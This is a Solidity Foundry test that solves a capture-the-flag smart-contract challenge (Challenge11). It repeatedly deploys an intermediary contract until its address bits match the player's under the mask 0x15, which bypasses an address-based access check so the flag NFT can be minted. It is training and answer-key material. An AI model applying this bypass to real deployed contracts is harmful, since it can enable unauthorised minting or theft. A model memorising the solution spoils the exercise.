// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Challenge11} from "../../src/Challenge11.sol";
import {NFTFlags} from "../../src/NFTFlags.sol";

// Step 1: create an intermediary contract to call mintFlag
contract CallChallenge11 {
    function callChallenge11(Challenge11 challenge11) public {
        challenge11.mintFlag();
    }
}

contract Challenge11Test is BaseTest {
    Challenge11 challenge11;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);

        challenge11 = new Challenge11(address(nftFlags));
        nftFlags.addAllowedMinter(address(challenge11));

        vm.stopPrank();
    }

    function test_challenge11() public {
        vm.startPrank(PLAYER, PLAYER);

        while (true) {
            // Step 2: keep deploying a contract until the masked addresses match
            CallChallenge11 caller = new CallChallenge11();

            // Here, the last byte of each address is at index 19 (20th byte)
            uint8 senderLastByte = uint8(abi.encodePacked(address(caller))[19]);
            uint8 originLastByte = uint8(abi.encodePacked(PLAYER)[19]);

            // Check if the expected bits match
            // 0x15 = 0b00010101, so we're checking if the 1st, 3rd, and 5th bits match (counting from the right)
            if ((senderLastByte & 0x15) == (originLastByte & 0x15)) {
                // If they match, call the contract (otherwise, deploy another contract and try again)
                caller.callChallenge11(challenge11);
                break;
            }
        }

        // DONE: You should have obtained the flag for challenge #11
        assertTrue(nftFlags.hasMinted(PLAYER, 11));
    }
}
